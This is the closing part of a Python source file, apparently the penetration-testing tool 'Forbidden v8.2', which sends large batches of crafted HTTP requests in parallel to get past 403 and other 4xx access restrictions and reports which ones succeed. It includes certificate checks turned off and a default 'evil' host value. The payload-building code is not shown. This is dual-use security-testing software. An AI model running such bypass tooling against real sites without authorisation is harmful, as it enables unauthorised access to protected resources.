			array = header.split(": ", 1)
			headers[uniquestr(array[0]) if array[0] in headers else array[0]] = array[1].encode(encoding) # supports duplicate headers
	if record["agent"]:
		headers["User-Agent"] = record["agent"].encode(encoding)
	proxies = {}
	if record["proxy"]:
		proxies["http"] = proxies["https"] = record["proxy"]
	response = None
	session = requests.Session()
	session.max_redirects = 10
	try:
		request = requests.Request(record["method"], record["url"], headers = headers, data = record["body"])
		prepared = request.prepare()
		prepared.url = record["url"]
		response = session.send(prepared, proxies = proxies, timeout = 180, verify = False, allow_redirects = True)
		record["code"] = response.status_code
		record["length"] = len(response.content)
		if record["ignore"] and (record["ignore"]["text"] and re.search(record["ignore"]["text"], response.content.decode("ISO-8859-1"), re.IGNORECASE) or record["ignore"]["lengths"] and any(record["length"] == length for length in record["ignore"]["lengths"])):
			record["code"] = 0
	except requests.exceptions.RequestException:
		pass
	finally:
		if response is not None:
			response.close()
		session.close()
	return record

def remove(array, keys):
	for entry in array:
		for key in keys:
			entry.pop(key, None)
	return array

def output(record, color):
	print(termcolor.colored(jdump(record), color))
	return record

def create_table(results):
	table = [{"code": code, "count": 0} for code in sorted(unique(record["code"] for record in results))]
	for entry in table:
		for record in results:
			if record["code"] == entry["code"]:
				entry["count"] += 1
	return table

def table_horizontal_border():
	print("-" * 22)

def table_row(code, count, color = None):
	text = ("| {0:<6} | {1:<9} |").format(code, count)
	print(termcolor.colored(text, color) if color else text)

def table_header():
	table_row("Code", "Count")

def display_table(table):
	table_horizontal_border()
	table_header()
	table_horizontal_border()
	for entry in table:
		color = None
		if entry["code"] >= 500:
			color = "cyan"
		elif entry["code"] >= 400:
			color = "red"
		elif entry["code"] >= 300:
			color = "yellow"
		elif entry["code"] >= 200:
			color = "green"
		table_row(entry["code"], entry["count"], color)
	table_horizontal_border()

def parse_results(results):
	tmp = []
	# --------------------
	get_timestamp("Validating results...")
	# --------------------
	table = create_table(results)
	# --------------------
	results = [record for record in results if record["code"] > 0]
	results = sorted(results, key = lambda x: (x["code"], -x["length"], x["raw"]))
	results = remove(results, ["raw", "ignore", "proxy"])
	for record in results:
		if record["code"] >= 500:
			continue
			tmp.append(output(record, "cyan"))
		elif record["code"] >= 400:
			continue
			tmp.append(output(record, "red"))
		elif record["code"] >= 300:
			# continue
			tmp.append(output(record, "yellow"))
		elif record["code"] >= 200:
			# continue
			tmp.append(output(record, "green"))
	# --------------------
	display_table(table)
	# --------------------
	return tmp

def bypass(collection, threads = 10):
	results = []
	count = 0
	total = len(collection)
	print(("Number of created test records: {0}").format(total))
	get_timestamp("Running tests...")
	progress(count, total)
	with concurrent.futures.ThreadPoolExecutor(max_workers = threads) as executor:
		subprocesses = {executor.submit(send_request, record): record for record in collection}
		for subprocess in concurrent.futures.as_completed(subprocesses):
			results.append(subprocess.result())
			count += 1
			progress(count, total)
	return results

def main():
	argc = len(sys.argv) - 1

	if argc == 0:
		advanced()
	elif argc == 1:
		if sys.argv[1] == "-h":
			basic()
		elif sys.argv[1] == "--help":
			advanced()
		else:
			error("Incorrect usage", True)
	elif argc % 2 == 0 and argc <= len(args) * 2:
		for i in range(1, argc, 2):
			validate(sys.argv[i], sys.argv[i + 1])
		if args["url"] is None or args["tests"] is None or not check(argc, args):
			error("Missing a mandatory option (-u, -t) and/or optional (-f, -v, -p, -e, -i, -l, -th, -a, -x, -o)", True)
	else:
		error("Incorrect usage", True)

	if proceed:
		print("######################################################################")
		print("#                                                                    #")
		print("#                           Forbidden v8.2                           #")
		print("#                                by Ivan Sincek                      #")
		print("#                                                                    #")
		print("# Bypass 4xx HTTP response status codes and more.                    #")
		print("# GitHub repository at github.com/ivan-sincek/forbidden.             #")
		print("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14. #")
		print("#                                                                    #")
		print("######################################################################")
		# --------------------
		if not args["path"]:
			args["path"] = ["/robots.txt"]
		if not args["evil"]:
			args["evil"] = "github.com"
		if not args["threads"]:
			args["threads"] = 5
		if not args["agent"]:
			args["agent"] = "Forbidden/8.2"
		# --------------------
		url = parse_url(args["url"])
		ignore = {"text": args["ignore"], "lengths": args["lengths"] if args["lengths"] else []}
		# --------------------
		# NOTE: Fetch content length of base HTTP response.
		if "base" in ignore["lengths"]:
			ignore["lengths"].append(fetch(url["full"], args["force"] if args["force"] else "GET", None, None, None, args["agent"], None)["length"])
			ignore["lengths"].pop(ignore["lengths"].index("base"))
		# --------------------
		# NOTE: Fetch accessible URLs.
		records = fetch_accessible(append_paths(url["scheme_domain"], args["path"]), args["force"] if args["force"] else "GET", None, None, None, args["agent"], None)
		accessible = unique([record["url"] for record in records])
		if "path" in ignore["lengths"]:
			ignore["lengths"].extend([record["length"] for record in records])
			ignore["lengths"].pop(ignore["lengths"].index("path"))
		# --------------------
		# NOTE: Fetch base domain IPs.
		ips = fetch_ips(url["domain_no_port"])
		values = args["values"] + ips if args["values"] else ips
		# --------------------
		collection = get_collection(url, args["tests"], accessible, args["evil"], args["force"], values, ignore, args["agent"], args["proxy"])
		if not collection:
			print("No test records were created")
		else:
			results = parse_results(bypass(filter(get_commands(collection)), args["threads"]))
			if not results:
				print("No result matched the validation criteria")
			else:
				print(("Number of valid results: {0}").format(len(results)))
				if args["out"]:
					write_file(jdump(results), args["out"])
		print(("Script has finished in {0}").format(datetime.datetime.now() - start))

if __name__ == "__main__":
	main()

# ------------------------ TASK END ------------------------
